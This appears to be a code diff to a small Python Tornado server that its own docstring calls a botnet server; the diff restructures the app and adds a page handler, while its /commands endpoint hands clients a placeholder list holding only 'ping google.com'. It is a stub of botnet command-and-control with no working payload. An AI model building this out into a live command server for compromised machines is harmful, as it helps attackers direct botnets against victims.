@@ -1,21 +1,33 @@
-import tornado.ioloop
-import tornado.web
-import httpagentparser
-import json
-
-
 '''
     This is a botnet server implementation.
 
-    Missing: 
+    Missing:
         a) CommandsService.get_commands implementation
-'''    
+'''
 
+
+import tornado.ioloop
+import tornado.web
+import tornado.options
+from tornado.options import options, define
+import httpagentparser
+import json
+import os
+
+
+define('debug', default=True, help="debug mode", type=bool)
 
 class CommandsService():
     @staticmethod
     def get_commands(os, primaryLanguage, clientIp):
         return ['ping google.com']
+
+
+class MainHandler(tornado.web.RequestHandler):
+    """
+    """
+    def get(self):
+        self.render('index.html')
 
 
 class BotnetCommandsController(tornado.web.RequestHandler):
@@ -30,13 +42,26 @@ class BotnetCommandsController(tornado.web.RequestHandler):
         self.write(json.dumps(commands, ensure_ascii = False))
 
 
-def init_botnet_server():
-    return tornado.web.Application([
-        (r"/commands", BotnetCommandsController),
-    ])
+class Application(tornado.web.Application):
+    """
+    """
+    def __init__(self):
+        handlers = [
+            (r"/commands", BotnetCommandsController),
+            (r"/.*", MainHandler),
+            ]
+
+        settings = dict(
+            template_path=os.path.join(os.path.dirname(__file__), "files"),
+            static_path=os.path.join(os.path.dirname(__file__), "files"),
+            debug=options.debug,
+        )
+
+        super(Application, self).__init__(handlers, **settings)
 
 
 if __name__ == "__main__":
-    app = init_botnet_server()
-    app.listen(80)
+    tornado.options.parse_command_line()
+    app = Application()
+    app.listen(8080)
     tornado.ioloop.IOLoop.current().start()
